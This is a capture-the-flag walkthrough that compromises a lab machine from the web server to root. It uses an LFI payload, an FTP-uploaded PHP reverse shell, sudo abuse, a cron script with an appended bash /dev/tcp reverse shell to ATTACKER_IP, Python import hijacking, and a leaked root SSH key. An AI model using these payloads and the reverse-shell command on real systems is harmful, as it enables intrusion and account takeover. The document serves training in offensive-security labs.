Goal: Root access
Attack Chain: Web → LFI → FTP → Web Shell → Sudo Abuse → Cron Job → Python Whitelist Bypass → Log Abuse → SSH → Root

1️⃣ Initial Enumeration (Nmap)
nmap -sS -sV -sC 10.64.131.113 -T4

| Port | Service | Description |
| 21 | FTP | FTP service running |
| 22 | SSH | OpenSSH |
| 80 | HTTP | Web server |

➡️ Initial attack surface clearly web-based (port 80).

2️⃣ Web Enumeration (Port 80)
Website Visit
• Homepage accessible
• Static-looking website
• Images clickable
• URLs had POST parameter references
This suggested dynamic backend logic.

3️⃣ Directory Bruteforcing
ffuf -u 'http://10.64.131.113/FUZZ' -w /usr/share/dirb/wordlists/common.txt
◇ robots.txt discovered
◇ Also confirmed via Nikto scan

4️⃣ robots.txt Analysis
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt

◇ /flag_1.txt → readable → Flag 1 obtained
◇ /secret_file_do_not_read.txt → 403 Forbidden
➡️ Indicates file exists but access restricted, likely accessible indirectly.

5️⃣ Source Code & Parameter Analysis → LFI Discovery
Observation
◇ Clicking images loaded files via POST parameter
◇ URL format:
post.php?post=somefile.php
➡️ This strongly indicates Local File Inclusion (LFI) vulnerability.

6️⃣ Exploiting LFI
Vulnerable Endpoint
http://10.64.131.113/post.php?post=bunch.php
Exploit Payload
http://10.64.131.113/post.php?post=secret_file_do_not_read.txt
Credentials leaked:
ftpuser:givemefiles777
➡️ Sensitive file accessed via LFI, bypassing direct restriction.

7️⃣ FTP Access
ftp 10.64.131.113
username: ftpuser
password: givemefiles777

Findings
◇ Directory: files
◇ Writable permissions
◇ flag_2.txt found → Flag 2 obtained



8️⃣ Web Shell Upload via FTP
Action
Uploaded PHP reverse shell:
put shell1.php
Triggering Web Shell
http://10.64.131.113/post.php?post=/home/ftpuser/ftp/files/shell1.php
Result
✔️ Reverse shell obtained
 ✔️ User: www-data

9️⃣ Privilege Escalation: www-data → toby (Sudo Abuse)
Command
sudo -l
Output
(www-data) NOPASSWD: ALL (toby)
Exploit
sudo -u toby /bin/bash
➡️ Passwordless full sudo as user toby

🔟 Cron Job Enumeration (as toby)
Discovery
◇ File: note.txt
◇ Mentions cron jobs already set
Directory
/home/toby/jobs/
File
cow.sh
Behavior
◇ Runs every 1 minute
◇ Writable by toby
1️⃣1️⃣ Cron Job Abuse → toby → mat

Exploit
Append reverse shell to cron script:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4500 0>&1' >> cow.sh
Result
✔️ Reverse shell as user mat

1️⃣2️⃣ Sudo Abuse: mat → will

Check
sudo -l

Output
(will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *


➡️ Allowed to run specific Python script as user will.

1️⃣3️⃣ Script Analysis

cmd.py
def get_command(num):
    if(num == "1"):
        return "ls -lah"
    if(num == "2"):
        return "id"
    if(num == "3"):
        return "cat /etc/passwd"
will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
    print("Invalid command!")
    exit()

os.system(cmd)



1️⃣4️⃣ Python Import Hijacking (CRITICAL)

Issue
◇ cmd.py is writable
◇ Python imports local files before system modules
◇ os.system() executes whatever get_command() returns
➡️ Whitelist is useless if source is compromised

1️⃣5️⃣ Exploit: Modify cmd.py

Payload Injected
Overwrite cmd.py with reverse shell code.
Trigger
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
Result
✔️ Reverse shell as user will

1️⃣6️⃣ Group Enumeration (will)
id
Output
groups=1000(will),4(adm)
➡️ adm group = log file access

1️⃣7️⃣ Abusing adm Group Permissions
find / -group adm 2>/dev/null
Discovery
/opt/backups/key.b64

1️⃣8️⃣ Base64 Decode → SSH Key Leak
Decode

base64 -d key.b64 > id_rsa
chmod 600 id_rsa

SSH Login

ssh -i id_rsa root@10.64.131.113
🎉 Final Result
✔️ Root shell obtained
 ✔️ Machine fully compromised

🧠 Key Concepts Learned
◇ robots.txt information disclosure
◇ Local File Inclusion (LFI)
◇ FTP misconfiguration
◇ Web shell via LFI
◇ Sudo privilege escalation
◇ Cron job abuse
◇ Python import hijacking
◇ Whitelist bypass
◇ Log file abuse (adm group)
◇ SSH key extraction
